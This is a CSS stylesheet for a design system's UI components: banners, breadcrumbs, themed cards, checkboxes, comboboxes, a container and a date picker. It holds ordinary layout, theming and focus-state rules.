.stamp-basic-banner__body { grid-area: body; margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-basic-banner__footer { grid-area: footer; flex-flow: wrap; align-items: center; column-gap: var(--stamp-spacing-inner-xxl); row-gap: var(--stamp-spacing-inner-xl); margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-basic-banner__media { grid-area: media; overflow: hidden; position: relative; inset-inline: 50%; margin-inline: -50vw; inline-size: 100vw; max-block-size: 200px; }

.stamp-basic-banner__media img, .stamp-basic-banner__media picture { display: block; inline-size: 100%; block-size: 100%; object-fit: cover; }

@media (min-width: 680px) {
  .stamp-basic-banner { padding-block: 0px; }
  .stamp-basic-banner__content { grid-template-areas: &quot;header media&quot; &quot;body media&quot; &quot;footer media&quot;; grid-template-columns: repeat(2, 1fr); column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-basic-banner__body, .stamp-basic-banner__footer, .stamp-basic-banner__header { margin-inline: 0px; }
  .stamp-basic-banner__header { gap: var(--stamp-spacing-inner-m); }
  .stamp-basic-banner__footer { display: flex; flex-flow: wrap; }
  .stamp-basic-banner__header { margin-block-start: var(--stamp-spacing-inner-xxl); margin-block-end: 0px; }
  .stamp-basic-banner__body { margin-block-start: var(--stamp-spacing-inner-xl); }
  .stamp-basic-banner__footer { margin-block-start: var(--stamp-spacing-inner-xxl); }
  .stamp-basic-banner:has(.stamp-basic-banner__footer) .stamp-basic-banner__footer, .stamp-basic-banner:not(:has(.stamp-basic-banner__footer)) .stamp-basic-banner__body { margin-block-end: var(--stamp-spacing-inner-xxl); }
  .stamp-basic-banner__media { position: absolute; inset-inline: unset; block-size: 100%; max-block-size: unset; max-inline-size: 100%; margin-inline: unset; }
}

.stamp-breadcrumbs--small, a.stamp-breadcrumbs--small { }

.stamp-breadcrumbs--small .stamp-breadcrumb__item, a.stamp-breadcrumbs--small .stamp-breadcrumb__item { align-items: center; }

.stamp-breadcrumbs--small .stamp-breadcrumbs__link-icon, a.stamp-breadcrumbs--small .stamp-breadcrumbs__link-icon { padding-block-start: 3px; }

.stamp-breadcrumbs--large { display: none; }

.stamp-breadcrumbs__list { display: inline; }

.stamp-breadcrumbs--large .stamp-breadcrumbs__list { list-style: none; }

@media (min-width: 880px) {
  .stamp-breadcrumbs--small, a.stamp-breadcrumbs--small { display: none; }
  .stamp-breadcrumbs--large { display: block; }
}

.stamp-breadcrumbs__link-icon { max-inline-size: 8px; max-block-size: 8px; display: inline; color: var(--stamp-color-icon-default); }

.stamp-breadcrumbs-ellipsis { margin-inline-end: 6px; }

.stamp-breadcrumb { display: inline; font-family: var(--stamp-text-link-s-default-font-family); font-weight: var(--stamp-text-link-s-default-font-weight); font-size: var(--stamp-text-link-s-default-font-size); line-height: var(--stamp-text-link-s-default-line-height); letter-spacing: var(--stamp-text-link-s-default-letter-spacing); }

.stamp-breadcrumb__icon { display: inline-flex; justify-content: center; align-items: center; color: var(--stamp-color-icon-default); }

.stamp-breadcrumb__item .stamp-link__content { display: inline; }

.stamp-breadcrumb__icon { vertical-align: middle; inline-size: 8px; block-size: 8px; }

.stamp-breadcrumb__icon .stamp-icon__content { display: inline-flex; align-items: center; }

.stamp-breadcrumb__icon .stamp-icon__content svg { inline-size: 8px; block-size: 8px; }

.stamp-breadcrumb__icon--start, .stamp-breadcrumb__icon--end { margin-inline-end: 6px; }

.stamp-card { --card-background-color: var(--stamp-color-background-surface); position: relative; inline-size: 100%; block-size: 100%; padding-block-start: var(--stamp-spacing-inner-xl); background-color: var(--card-background-color); text-decoration: none; list-style-type: none; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-fallback); border-radius: var(--stamp-radius-s); }

.stamp-card__inner { display: grid; grid-template-rows: min-content auto min-content; inline-size: 100%; block-size: 100%; }

.stamp-card.stamp-card--size-s { max-inline-size: 359px; }

.stamp-card--theme-default { --card-background-color: var(--stamp-color-background-card-neutral-default); --card-link-background-color: var(--stamp-color-background-card-neutral-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-default { --card-footer-border-color: var(--stamp-color-background-card-neutral-accent); }

.stamp-card--theme-inverse { --card-background-color: var(--stamp-color-background-card-inverse-default); --card-link-background-color: var(--stamp-color-background-card-inverse-accent); --card-link-border-top-color: var(--stamp-color-border-default); }

.stamp-card--theme-orange { --card-background-color: var(--stamp-color-background-card-brand-orange-default); --card-link-background-color: var(--stamp-color-background-card-brand-orange-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-orange { --card-footer-border-color: var(--stamp-color-background-card-brand-orange-accent); }

.stamp-card--theme-dark-blue { --card-background-color: var(--stamp-color-background-card-brand-dark-blue-default); --card-link-background-color: var(--stamp-color-background-card-brand-dark-blue-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-dark-blue { --card-footer-border-color: var(--stamp-color-background-card-brand-dark-blue-accent); }

.stamp-card--theme-blue { --card-background-color: var(--stamp-color-background-card-brand-blue-default); --card-link-background-color: var(--stamp-color-background-card-brand-blue-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-blue { --card-footer-border-color: var(--stamp-color-background-card-brand-blue-accent); }

.stamp-card--theme-green { --card-background-color: var(--stamp-color-background-card-brand-green-default); --card-link-background-color: var(--stamp-color-background-card-brand-green-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-green { --card-footer-border-color: var(--stamp-color-background-card-brand-green-accent); }

.stamp-card--theme-red { --card-background-color: var(--stamp-color-background-card-brand-red-default); --card-link-background-color: var(--stamp-color-background-card-brand-red-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-red { --card-footer-border-color: var(--stamp-color-background-card-brand-red-accent); }

.stamp-card--theme-orange, .stamp-card--theme-orange [class*=&quot;stamp-&quot;], .stamp-card--theme-dark-blue, .stamp-card--theme-dark-blue [class*=&quot;stamp-&quot;], .stamp-card--theme-blue, .stamp-card--theme-blue [class*=&quot;stamp-&quot;], .stamp-card--theme-green, .stamp-card--theme-green [class*=&quot;stamp-&quot;], .stamp-card--theme-red, .stamp-card--theme-red [class*=&quot;stamp-&quot;] { color: var(--stamp-color-text-on-brand); }

.stamp-card--theme-orange [class*=&quot;stamp-heading&quot;], .stamp-card--theme-dark-blue [class*=&quot;stamp-heading&quot;], .stamp-card--theme-blue [class*=&quot;stamp-heading&quot;], .stamp-card--theme-green [class*=&quot;stamp-heading&quot;], .stamp-card--theme-red [class*=&quot;stamp-heading&quot;] { color: var(--stamp-color-heading-on-brand); }

.stamp-card--theme-orange [class*=&quot;stamp-text&quot;], .stamp-card--theme-dark-blue [class*=&quot;stamp-text&quot;], .stamp-card--theme-blue [class*=&quot;stamp-text&quot;], .stamp-card--theme-green [class*=&quot;stamp-text&quot;], .stamp-card--theme-red [class*=&quot;stamp-text&quot;] { color: var(--stamp-color-text-on-brand); }

.stamp-card--theme-orange .stamp-card-link [class*=&quot;stamp-&quot;], .stamp-card--theme-dark-blue .stamp-card-link [class*=&quot;stamp-&quot;], .stamp-card--theme-blue .stamp-card-link [class*=&quot;stamp-&quot;], .stamp-card--theme-green .stamp-card-link [class*=&quot;stamp-&quot;], .stamp-card--theme-red .stamp-card-link [class*=&quot;stamp-&quot;] { color: var(--stamp-color-text-link-on-brand); outline-color: var(--stamp-color-text-link-on-brand); }

.stamp-card--theme-orange .stamp-card-button[class*=&quot;stamp-&quot;], .stamp-card--theme-dark-blue .stamp-card-button[class*=&quot;stamp-&quot;], .stamp-card--theme-blue .stamp-card-button[class*=&quot;stamp-&quot;], .stamp-card--theme-green .stamp-card-button[class*=&quot;stamp-&quot;], .stamp-card--theme-red .stamp-card-button[class*=&quot;stamp-&quot;] { color: var(--stamp-color-text-on-brand); outline-color: var(--stamp-color-text-on-brand); }

.stamp-card--theme-orange [class*=&quot;stamp-icon&quot;], .stamp-card--theme-dark-blue [class*=&quot;stamp-icon&quot;], .stamp-card--theme-blue [class*=&quot;stamp-icon&quot;], .stamp-card--theme-green [class*=&quot;stamp-icon&quot;], .stamp-card--theme-red [class*=&quot;stamp-icon&quot;], .stamp-card--theme-orange .stamp-card-link .stamp-link__icon, .stamp-card--theme-dark-blue .stamp-card-link .stamp-link__icon, .stamp-card--theme-blue .stamp-card-link .stamp-link__icon, .stamp-card--theme-green .stamp-card-link .stamp-link__icon, .stamp-card--theme-red .stamp-card-link .stamp-link__icon { color: var(--stamp-color-icon-on-brand); }

.stamp-card__header { margin-block-end: var(--stamp-spacing-inner-s); padding-inline: var(--stamp-spacing-inner-xl); }

.stamp-card__body { inline-size: 100%; margin-block-end: var(--stamp-spacing-outer-m); padding-inline: var(--stamp-spacing-inner-xl); }

@media screen and (min-width: 481px) {
  .stamp-card__body > .stamp-text { max-inline-size: 532px; }
}

.stamp-card__footer { display: flex; flex-flow: column wrap; gap: var(--stamp-spacing-inner-l); padding-inline: var(--stamp-spacing-inner-xl); border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--card-footer-border-color, var(--stamp-color-border-fallback)); border-radius: 0 0 var(--stamp-radius-s) var(--stamp-radius-s); }

.stamp-card:has(.stamp-card-link) .stamp-card__footer { background-color: var(--card-link-background-color); border-top: var(--stamp-border-width-s) solid var(--card-link-border-top-color, var(--stamp-color-border-fallback)); }

.stamp-card.stamp-card--in-list { margin-block: calc(var(--stamp-spacing-inner-xxl) / 2); }

.stamp-card--spotlight { border-color: var(--stamp-color-border-selected); }

.stamp-card--spotlight.stamp-card--in-list { inline-size: calc(100% + var(--stamp-spacing-inner-xxl)); }

.stamp-card__spotlight { position: absolute; inset-block-start: 0px; inset-inline-start: 50%; padding: var(--stamp-spacing-inner-xs) var(--stamp-spacing-inner-s); transform: translateX(-50%) translateY(-50%); z-index: 1; color: var(--stamp-color-text-inverse); border-radius: var(--stamp-radius-s) var(--stamp-radius-s) 0 var(--stamp-radius-s); background-color: var(--stamp-color-background-brand); font-family: var(--stamp-text-body-l-default-font-family), sans-serif; font-weight: 700; line-height: var(--stamp-text-body-l-default-line-height); font-size: var(--stamp-text-body-l-default-font-size); letter-spacing: var(--stamp-text-body-l-default-letter-spacing); }

.stamp-card-button { position: relative; z-index: 1; align-self: flex-start; }

.stamp-card-button:last-child { margin-block-end: var(--stamp-spacing-inner-xl); }

.stamp-card-button--block { position: static; }

.stamp-card-button--block::after { z-index: 0; content: &quot;&quot;; position: absolute; top: 0px; left: 0px; inline-size: 100%; block-size: 100%; }

.stamp-card-link { display: flex; gap: var(--stamp-spacing-outer-xs); padding-block: var(--stamp-spacing-inner-l); inline-size: 100%; }

.stamp-card-link .stamp-link { gap: var(--stamp-spacing-inner-xs); }

.stamp-card-link__link--block { position: static; }

a.stamp-card-link--block::after, div.stamp-card-link--block a::after { z-index: 0; content: &quot;&quot;; position: absolute; top: 0px; left: 0px; inline-size: 100%; block-size: 100%; }

.stamp-card-list { display: flex; gap: var(--stamp-spacing-inner-xl); }

.stamp-checkbox-input { appearance: none; font: inherit; margin: 0px; padding: var(--stamp-spacing-inner-xxs); inline-size: 24px; block-size: 24px; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); cursor: pointer; position: relative; border-radius: var(--stamp-radius-s); flex-shrink: 0; align-self: start; background-color: var(--stamp-color-background-surface); }

.stamp-checkbox-input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-checkbox-input::before { content: &quot;&quot;; position: absolute; inset-inline-start: calc(50% - var(--stamp-size-icon-s) / 2); inset-block-start: calc(50% - var(--stamp-size-icon-s) / 2); inline-size: var(--stamp-size-icon-s); block-size: var(--stamp-size-icon-s); }

.stamp-checkbox-input:checked:disabled:not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-input:checked:not(:disabled):not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-input--invalid:checked:not(:disabled):not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-checkbox-input:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-checkbox-input:not(:disabled):focus { outline: none; }
  .stamp-checkbox-input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-checkbox-input:disabled { border-color: var(--stamp-color-border-disabled); background-color: var(--stamp-color-background-disabled); cursor: not-allowed; }

.stamp-checkbox-input:indeterminate:not(.stamp-checkbox-input--invalid) { background-position: 0% 0%; background-repeat: no-repeat; background-attachment: scroll; background-image: url(&quot;&quot;); background-size: auto; background-origin: padding-box; background-clip: border-box; background-color: var(--stamp-color-background-disabled); }

.stamp-checkbox-input:indeterminate:not(.stamp-checkbox-input--invalid):not(:disabled) { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-input--invalid:indeterminate { background: url(&quot;&quot;) no-repeat; border-color: var(--stamp-color-border-error); }

.stamp-checkbox-button { position: relative; }

.stamp-checkbox-button__label { position: relative; cursor: pointer; padding-inline-start: var(--stamp-spacing-inner-4-xl); padding-inline-end: var(--stamp-spacing-inner-l); min-height: 72px; display: flex; align-items: center; border-style: solid; border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-fallback); border-radius: var(--stamp-radius-xs); background-color: var(--stamp-color-background-variant); color: var(--stamp-color-text-form-control-value-default); }

.stamp-checkbox-button__illustration { position: relative; margin-inline-start: calc(var(--stamp-spacing-inner-m) * -1); opacity: var(--stamp-opacity-illustration-default); mix-blend-mode: var(--stamp-blend-mode-default); }

.stamp-checkbox-button--disabled .stamp-checkbox-button__illustration { opacity: var(--stamp-opacity-illustration-disabled); mix-blend-mode: var(--stamp-blend-mode-disabled); }

.stamp-checkbox-button__illustration-badge { display: block; position: absolute; inline-size: 30%; block-size: 30%; inset-block-start: 12%; inset-inline-end: 8%; }

.stamp-checkbox-button__illustration-badge .stamp-icon, .stamp-checkbox-button__illustration-badge svg { display: block; inline-size: 100%; block-size: 100%; }

.stamp-checkbox-button__text-content { display: flex; flex-direction: column; padding-block: calc(var(--stamp-spacing-inner-l) - var(--stamp-border-width-s)); padding-inline-start: var(--stamp-spacing-inner-s); }

.stamp-checkbox-button--disabled .stamp-checkbox-button__label { cursor: not-allowed; background-color: var(--stamp-color-background-disabled); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-checkbox-button--disabled .stamp-checkbox-button__input { cursor: not-allowed; border-color: var(--stamp-color-border-disabled); background-color: var(--stamp-color-background-disabled); }

.stamp-checkbox-button--invalid .stamp-checkbox-button__label { border-color: var(--stamp-color-border-error); }

.stamp-checkbox-button:not(.stamp-checkbox-button--disabled):hover .stamp-checkbox-button__label { border-color: var(--stamp-color-border-hover); }

.stamp-checkbox-button .stamp-checkbox-button__input:focus ~ .stamp-checkbox-button__label { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 5px; }

@supports selector(:focus-visible) {
  .stamp-checkbox-button .stamp-checkbox-button__input:focus ~ .stamp-checkbox-button__label { outline: none; }
  .stamp-checkbox-button .stamp-checkbox-button__input:focus-visible ~ .stamp-checkbox-button__label { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 5px; }
}

.stamp-checkbox-button__title { font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); line-height: var(--stamp-text-form-label-line-height); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); }

.stamp-checkbox-button__message { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-checkbox-button__input { appearance: none; z-index: 1; font: inherit; margin: 0px; padding: var(--stamp-spacing-inner-xxs); inline-size: 24px; block-size: 24px; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); cursor: pointer; border-radius: var(--stamp-radius-s); position: absolute; inset-inline-start: 16px; inset-block-start: 50%; transform: translateY(-50%); }

.stamp-checkbox-button__input:is(:checked, :indeterminate)::before { content: &quot;&quot;; position: absolute; left: calc(50% - var(--stamp-size-icon-s) / 2); top: calc(50% - var(--stamp-size-icon-s) / 2); inline-size: var(--stamp-size-icon-s); block-size: var(--stamp-size-icon-s); }

.stamp-checkbox-button__input:checked:not(:disabled):not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-button__input:checked:disabled:not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-button:not(.stamp-checkbox-button--invalid) .stamp-checkbox-button__input:indeterminate { background-position: 0% 0%; background-repeat: no-repeat; background-attachment: scroll; background-image: url(&quot;&quot;); background-size: auto; background-origin: padding-box; background-clip: border-box; background-color: var(--stamp-color-background-disabled); }

.stamp-checkbox-button:not(.stamp-checkbox-button--invalid) .stamp-checkbox-button__input:indeterminate:not(:disabled) { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-button.stamp-checkbox-button--invalid .stamp-checkbox-button__input:indeterminate { background: url(&quot;&quot;) no-repeat; border-color: var(--stamp-color-border-error); }

.stamp-checkbox-button__input:checked:not(:disabled) ~ .stamp-checkbox-button__label::before { content: &quot;&quot;; position: absolute; inset-inline-start: calc(-1 * (var(--stamp-border-width-s))); inset-block-start: calc(-1 * var(--stamp-border-width-s)); inline-size: calc(100% + (2 * var(--stamp-border-width-s))); block-size: calc(100% + (2 * var(--stamp-border-width-s))); outline: 2px solid var(--stamp-color-border-selected); outline-offset: 2px; border-radius: var(--stamp-radius-xs); }

.stamp-checkbox-button--invalid .stamp-checkbox-button__input:checked:not(:disabled) ~ .stamp-checkbox-button__label { border-color: var(--stamp-color-border-error); }

.stamp-checkbox-button__input:not(:disabled):focus { outline: none; }

.stamp-combobox-input { position: relative; inline-size: 100%; }

.stamp-combobox-input__icon { width: var(--stamp-size-icon-m); block-size: 100%; position: absolute; display: flex; align-items: center; inset-inline-start: var(--stamp-spacing-inner-s); color: var(--stamp-color-icon-default); }

.stamp-combobox-input__input { padding-inline-start: var(--stamp-spacing-inner-l); padding-inline-end: var(--stamp-spacing-inner-xxl); padding-block: var(--stamp-spacing-inner-s); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-strong); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); border-radius: var(--stamp-radius-s); border-style: solid; z-index: 1; appearance: none; inline-size: 100%; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

.stamp-combobox-input__input--has-icon { padding-inline-start: calc(var(--stamp-spacing-inner-m) + var(--stamp-size-icon-m)); }

.stamp-combobox-input__input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); }

.stamp-combobox-input__input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); }

.stamp-combobox-input__input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-combobox-input__input:not(:disabled):focus { outline-color: var(--stamp-color-border-hover); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-combobox-input__input:not(:disabled):focus { outline: none; }
  .stamp-combobox-input__input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-hover); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-combobox-input__input:disabled { background-color: var(--stamp-color-background-default); cursor: not-allowed; -webkit-text-fill-color: var(--stamp-color-text-form-control-value-disabled); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-combobox-input__input:disabled::placeholder { -webkit-text-fill-color: var(--stamp-color-text-form-control-placeholder-disabled); color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-combobox-input__input:disabled::placeholder { -webkit-text-fill-color: var(--stamp-color-text-form-control-placeholder-disabled); color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-combobox-input:has(.stamp-combobox-input__input:disabled) .stamp-combobox-input__icon { color: var(--stamp-color-icon-disabled); }

.stamp-combobox-input__input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-combobox-input__data-list { list-style: none; position: absolute; inline-size: 100%; padding-block: var(--stamp-spacing-inner-s); will-change: transform; filter: drop-shadow(var(--stamp-drop-shadow-flyout-down)); border-radius: var(--stamp-radius-s); background-color: var(--stamp-color-background-surface); max-height: 316px; overflow: auto; z-index: var(--z-index-above); }

.stamp-combobox-input__data-list--hidden { visibility: hidden; height: 0px; overflow: hidden; }

.stamp-combobox-input__data-list:empty { display: none; }

.stamp-combobox-input__data-list-item { cursor: pointer; padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-l); background-color: var(--stamp-color-background-data-list-default); border-inline-start-width: var(--stamp-border-width-m); border-inline-start-style: solid; border-inline-start-color: transparent; color: var(--stamp-color-text-link-default); font-family: var(--stamp-text-form-data-list-title-default-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-title-default-font-weight); line-height: var(--stamp-text-form-data-list-title-default-line-height); font-size: var(--stamp-text-form-data-list-title-default-font-size); }

.stamp-combobox-input__data-list-item:active { border-inline-start-width: var(--stamp-border-width-m); border-inline-start-style: solid; border-inline-start-color: var(--stamp-color-border-pressed); background-color: var(--stamp-color-background-data-list-pressed); color: var(--stamp-color-text-link-pressed); font-family: var(--stamp-text-form-data-list-title-pressed-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-title-pressed-font-weight); line-height: var(--stamp-text-form-data-list-title-pressed-line-height); font-size: var(--stamp-text-form-data-list-title-pressed-font-size); }

.stamp-combobox-input__data-list-item--selected { border-inline-start-width: var(--stamp-border-width-m); border-inline-start-style: solid; border-inline-start-color: var(--stamp-color-border-selected); background-color: var(--stamp-color-background-data-list-selected); color: var(--stamp-color-text-link-subtle); }

.stamp-combobox-input__data-list-item--highlighted { background-color: var(--stamp-color-background-data-list-hover); border-inline-start-color: var(--stamp-color-border-hover); color: var(--stamp-color-text-link-hover); font-family: var(--stamp-text-form-data-list-title-highlighted-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-title-highlighted-font-weight); line-height: var(--stamp-text-form-data-list-title-highlighted-line-height); font-size: var(--stamp-text-form-data-list-title-highlighted-font-size); }

.stamp-combobox-input__data-list-item-text-highlight { text-decoration: var(--stamp-text-form-data-list-title-highlighted-text-decoration); }

.stamp-combobox-input__section-name { padding-inline: var(--stamp-spacing-inner-l); padding-block-start: var(--stamp-spacing-inner-m); padding-block-end: var(--stamp-spacing-inner-xs); color: var(--stamp-color-text-form-control-value-default); font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); }

.stamp-combobox-input__section-list { list-style: none; }

.stamp-combobox-input__toggle-button { position: absolute; inset-inline-end: 0px; inset-block-start: 0px; border: medium; block-size: 100%; background-color: transparent; padding-inline: var(--stamp-spacing-inner-l); cursor: pointer; }

.stamp-combobox-input__toggle-button:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-color: var(--stamp-color-border-focus-outline); outline-offset: -1px; border-radius: var(--stamp-border-width-l); }

.stamp-combobox-input__toggle-button:disabled { cursor: not-allowed; }

.stamp-combobox-input__toggle-button-icon { inline-size: 8px; block-size: 8px; color: var(--stamp-color-text-subtle); }

.stamp-combobox-input--size-narrow { inline-size: 50%; }

.stamp-combobox-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-combobox-input { inline-size: 50%; }
  .stamp-combobox-input--size-narrow { inline-size: 25%; }
  .stamp-combobox-input--size-full { inline-size: 100%; }
}

.stamp-combobox-option { display: flex; flex-direction: column; }

.stamp-combobox-option__header { display: flex; align-items: center; }

.stamp-combobox-option__title--subtle { color: var(--stamp-color-text-default); font-family: var(--stamp-text-form-data-list-body-default-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-body-default-font-weight); line-height: var(--stamp-text-form-data-list-body-default-line-height); font-size: var(--stamp-text-form-data-list-body-default-font-size); letter-spacing: var(--stamp-text-form-data-list-body-default-letter-spacing); }

.stamp-combobox-option__icon { color: var(--stamp-color-icon-default); margin-inline-end: var(--stamp-spacing-inner-s); }

.stamp-combobox-option__subtitle { color: var(--stamp-color-text-default); font-family: var(--stamp-text-form-data-list-body-default-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-body-default-font-weight); line-height: var(--stamp-text-form-data-list-body-default-line-height); font-size: var(--stamp-text-form-data-list-body-default-font-size); letter-spacing: var(--stamp-text-form-data-list-body-default-letter-spacing); }

.stamp-combobox-option__subtitle--with-icon { padding-inline-start: calc(var(--stamp-size-icon-m) + var(--stamp-spacing-inner-s)); }

.stamp-container { overflow-x: clip; inline-size: 100%; }

.stamp-container__content { inline-size: 100%; padding-inline: var(--stamp-spacing-outer-s); margin-inline: auto; }

@media (min-width: 680px) {
  .stamp-container__content { padding-inline: var(--stamp-spacing-outer-m); }
}

@media (min-width: 880px) {
  .stamp-container__content { padding-inline: var(--stamp-spacing-outer-xl); }
}

.stamp-container--fixed .stamp-container__content { max-inline-size: 1104px; }

.stamp-container--full-width .stamp-container__content { max-inline-size: none; inline-size: 100%; padding-inline: 0px; overflow: auto; }

@media (min-width: 1280px) {
  .stamp-container--fixed .stamp-container__content { padding-inline: 0px; }
}

.stamp-date-input { max-inline-size: 155px; }

.stamp-date-input input { appearance: none; min-block-size: calc(1.5rem + 2 * var(--stamp-spacing-inner-s)); background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

.stamp-date-input input::-webkit-calendar-picker-indicator { display: none; }

input::-webkit-date-and-time-value { margin: 0px; }

.stamp-date-picker { position: absolute; bottom: 0px; z-index: var(--z-index-above); background-color: var(--stamp-color-background-date-input-date-default); transform: translateY(100%); filter: drop-shadow(0px 2px 2px var(--stamp-color-border-default)); padding: var(--stamp-spacing-inner-s); font-family: var(--stamp-text-form-date-input-date-default-font-family), sans-serif; font-weight: var(--stamp-text-form-date-input-date-default-font-weight); line-height: var(--stamp-text-form-date-input-date-default-line-height); font-size: var(--stamp-text-form-date-input-date-default-font-size); letter-spacing: var(--stamp-text-form-date-input-date-default-letter-spacing); color: var(--stamp-color-text-date-input-date-default); border-radius: var(--stamp-radius-xs); }

.stamp-date-picker__header { display: flex; justify-content: space-between; align-items: center; margin-block: var(--stamp-spacing-inner-m); color: var(--stamp-color-text-date-input-date-strong); }

.stamp-date-picker--weeknumbers .stamp-date-picker__header, .stamp-date-picker--weeknumbers .stamp-date-picker__day-list { margin-inline-start: var(--stamp-spacing-inner-xl); }

.stamp-date-picker__day-list { display: flex; flex-direction: row; margin-block-end: var(--stamp-spacing-inner-s); color: var(--stamp-color-heading-subtle); }

.stamp-date-picker__day { inline-size: 35px; text-align: center; font-family: var(--stamp-text-heading-xxs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xxs-font-weight); line-height: var(--stamp-text-heading-xxs-line-height); font-size: var(--stamp-text-heading-xxs-font-size); letter-spacing: var(--stamp-text-heading-xxs-letter-spacing); }

.stamp-date-picker__dates { display: grid; grid-template-columns: repeat(7, 35px); grid-template-rows: repeat(5, 35px); grid-column: auto; }

.stamp-date-picker__date { border-style: solid; border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-default); background-color: var(--stamp-color-background-date-input-date-default); block-size: 36px; inline-size: 36px; cursor: pointer; color: var(--stamp-color-text-date-input-date-default); font-family: var(--stamp-text-form-date-input-date-default-font-family), sans-serif; font-weight: var(--stamp-text-form-date-input-date-default-font-weight); line-height: var(--stamp-text-form-date-input-date-default-line-height); font-size: var(--stamp-text-form-date-input-date-default-font-size); letter-spacing: var(--stamp-text-form-date-input-date-default-letter-spacing); }

.stamp-date-picker__date:not(:disabled):hover { color: var(--stamp-color-text-date-input-date-hover); border-color: var(--stamp-color-border-hover); border-width: var(--stamp-border-width-m); z-index: var(--z-index-base); font-family: var(--stamp-text-form-date-input-date-hover-font-family), sans-serif; font-weight: var(--stamp-text-form-date-input-date-hover-font-weight); line-height: var(--stamp-text-form-date-input-date-hover-line-height); font-size: var(--stamp-text-form-date-input-date-hover-font-size); letter-spacing: var(--stamp-text-form-date-input-date-hover-letter-spacing); text-decoration: var(--stamp-text-form-date-input-date-hover-text-decoration); }

.stamp-date-picker__date:not(:disabled):active { color: var(--stamp-color-text-date-input-date-pressed); border-color: var(--stamp-color-border-pressed); z-index: var(--z-index-base); font-family: var(--stamp-text-form-date-input-date-pressed-font-family), sans-serif; font-weight: var(--stamp-text-form-date-input-date-pressed-font-weight); line-height: var(--stamp-text-form-date-input-date-pressed-line-height); font-size: var(--stamp-text-form-date-input-date-pressed-font-size); letter-spacing: var(--stamp-text-form-date-input-date-pressed-letter-spacing); text-decoration: var(--stamp-text-form-date-input-date-pressed-text-decoration); }

.stamp-date-picker__date--selected { z-index: var(--z-index-above); border-color: var(--stamp-color-border-selected); border-width: var(--stamp-border-width-m); }

.stamp-date-picker__date--today { color: var(--stamp-color-text-date-input-today-default); background-color: var(--stamp-color-background-date-input-today-default); }

.stamp-date-picker__date--today:not(:disabled):hover { color: var(--stamp-color-text-date-input-today-default); }

